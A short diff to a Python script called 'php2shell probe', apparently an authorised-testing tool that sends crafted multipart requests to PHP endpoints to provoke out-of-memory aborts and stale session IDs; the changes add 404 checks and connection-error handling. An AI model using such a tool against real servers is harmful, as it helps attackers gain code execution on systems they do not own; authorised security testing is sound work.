@@ -39,6 +39,7 @@ Use only against systems you are authorised to test.
 import argparse
 import http.client
 import re
+import socket
 import sys
 import time
 from urllib.parse import urlparse
@@ -126,6 +127,9 @@ def cmd_oom(a):
     body = multipart(progress_value=key, file_parts=1)
     t0 = time.time()
     st, hdrs, text = send(a.host, a.port, a.path, body, sid=a.sid, timeout=a.timeout)
+    if st == 404:
+        print(f"[-] {a.path} returned 404: no endpoint to send the multipart body to")
+        return 1
     oom_text = "Allowed memory size" in text
     sid_cookie = cookie_sid(hdrs)
     # The abort happens before the script runs, so there is no body and no cookie.
@@ -163,6 +167,9 @@ def cmd_stale_sid(a):
         print(f"[-] request A failed: {exc}")
         return 1
     aborted_a = (not text_a.strip()) and not cookie_sid(hdrs_a)
+    if st_a == 404:
+        print(f"[-] {a.path} returned 404: no endpoint to send the multipart body to")
+        return 1
     print(f"[*] A: HTTP {st_a}, body={len(text_a)}B, cookie={cookie_sid(hdrs_a)}, "
           f"aborted={aborted_a}")
     if not aborted_a:
@@ -261,8 +268,12 @@ def main():
 
     print(f"[*] php2shell probe -> {a.target}{a.path}")
     print(f"[*] mode={a.mode}")
-    return {"recon": cmd_recon, "oom": cmd_oom,
-            "stale-sid": cmd_stale_sid, "sweep": cmd_sweep}[a.mode](a)
+    try:
+        return {"recon": cmd_recon, "oom": cmd_oom,
+                "stale-sid": cmd_stale_sid, "sweep": cmd_sweep}[a.mode](a)
+    except (ConnectionError, socket.timeout, OSError) as exc:
+        print(f"[-] cannot reach {a.target}{a.path}: {exc}")
+        return 1
 
 
 if __name__ == "__main__":
